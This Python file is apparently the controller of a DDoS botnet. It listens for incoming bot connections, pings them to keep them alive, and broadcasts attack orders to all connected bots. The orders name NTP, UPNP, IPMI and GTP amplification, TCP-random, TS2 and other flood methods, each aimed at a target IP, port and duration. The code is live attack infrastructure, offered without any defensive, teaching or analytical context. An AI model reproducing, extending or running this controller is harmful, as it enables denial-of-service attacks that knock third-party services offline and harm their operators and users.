import socket
import pickle
import threading
import sys
from time import sleep


def msgrec(conn):
    while True:
        msg = conn.recv(99)
        if not msg.decode('utf-8') == '\r\n':break
    return msg.decode('UTF-8').strip()

class Bot:
    def __init__(self,conn,addr):
        self.conn = conn
        self.addr = addr
    def sendntp(self,ip,port,time):
        attack = ['NTP',ip,port,time]
        data = pickle.dumps(attack)
        self.conn.send(data)
    def sendstd(self,ip,port,time):
        attack = ['STD',ip,port,time]
        data = pickle.dumps(attack)
        self.conn.send(data)
    def sendupnp(self,ip,port,time):
        attack = ['UPNP',ip,port,time]
        data = pickle.dumps(attack)
        self.conn.send(data)
    def sendrcmp(self,ip,port,time):
        attack = ['RCMP',ip,port,time]
        data = pickle.dumps(attack)
        self.conn.send(data)
    def sendipmi(self,ip,port,time):
        attack = ['IPMI',ip,port,time]
        data = pickle.dumps(attack)
        self.conn.send(data)
    def sendtcprand(self,ip,port,time):
        attack = ['TCPRAND',ip,port,time]
        data = pickle.dumps(attack)
        self.conn.send(data)
    def sendts2(self,ip,port,time):
        attack = ['TS2',ip,port,time]
        data = pickle.dumps(attack)
        self.conn.send(data)
    def sendgtp1(self,ip,port,time):
        attack = ['GTP1',ip,port,time]
        data = pickle.dumps(attack)
        self.conn.send(data)
    def sendgtp2(self,ip,port,time):
        attack = ['GTP2',ip,port,time]
        data = pickle.dumps(attack)
        self.conn.send(data)
class Listener:
    def __init__(self,port):
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.bots = []
        self.port = port
        self.sock.bind(('0.0.0.0',self.port))
        self.sock.listen(5)
        print(f'NXLL SCANLISTEN ONLINE')
    def pingbot(self,bot):
        bot.conn.send(b'foo')
        self.sock.settimeout(2.0)
        try:
            data = msgrec(bot.conn)
            self.sock.settimeout(None)
            if data == 'bar':
                return True
            else:
                self.bots.remove(bot)
                return False
        except socket.timeout:
            self.bots.remove(bot)
            return False
    def handlebot(self,bot):
        try:
            while True:
                sleep(20)
                if not self.pingbot(bot):
                    sys.exit()
        except Exception as e:
            print(str(e))
            self.bots.remove(bot)
            sys.exit()
    def ntp(self,ip,port,time):
        for bot in self.bots:
            bot.sendntp(ip,port,time)
    def std(self,ip,port,time):
        for bot in self.bots:
            bot.sendstd(ip,port,time)
    def upnp(self,ip,port,time):
        for bot in self.bots:
            bot.sendupnp(ip,port,time)
    def rcmp(self,ip,port,time):
        for bot in self.bots:
            bot.sendrcmp(ip,port,time)
    def ipmi(self,ip,port,time):
        for bot in self.bots:
            bot.sendipmi(ip,port,time)
    def tcprand(self,ip,port,time):
        for bot in self.bots:
            bot.sendtcprand(ip,port,time)
    def ts2(self,ip,port,time):
        for bot in self.bots:
            bot.sendts2(ip,port,time)
    def gtp1(self,ip,port,time):
        for bot in self.bots:
            bot.sendgtp1(ip,port,time)
    def gtp2(self,ip,port,time):
        for bot in self.bots:
            bot.sendgtp2(ip,port,time)
    def startlisten(self):
        print(f'STARTED LISTEING ON PORT {self.port}')
        while True:
            conn,addr = self.sock.accept()
            print(f'NEW BOT - {addr}')
            newbot = Bot(conn,addr)
            self.bots.append(newbot)
            botthread = threading.Thread(target=self.handlebot, args=[newbot])
            botthread.start()

